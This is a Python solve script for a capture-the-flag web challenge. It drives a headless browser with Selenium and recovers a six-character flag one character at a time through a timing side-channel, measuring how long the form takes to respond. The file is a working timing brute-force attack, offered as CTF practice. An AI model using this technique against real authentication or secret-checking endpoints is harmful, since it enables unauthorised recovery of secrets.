from selenium import webdriver
from selenium.webdriver.common.by import By
from pyvirtualdisplay import Display
import time
import string

# Open a virtual window
display = Display(visible=0, size=(800, 600))
display.start()

# Open the challenge's page
driver = webdriver.Chrome()
url = 'http://time-is-key.challs.olicyber.it/index.php'
driver.get(url)

alpha = string.digits + string.ascii_lowercase
flag = ''

for i in range(0,6):
    for j in alpha:

        # Find input form and write the flag
        input_flag = driver.find_element(By.XPATH, '/html/body/form/input[1]')
        input_flag.send_keys(flag + j + alpha[0 : 5 - len(flag)])

        # Find input button and send the flag misuring response time
        enter = driver.find_element(By.XPATH, '/html/body/form/input[2]')
        start = time.perf_counter()
        enter.click()
        end = time.perf_counter()

        # If the response time has incremented by 1 second you have find
        # a good character, then add to the flag
        if end - start > i + 1:
            flag += j
            break
print('flag{' + flag + '}')

# Close the virtual window
driver.close()

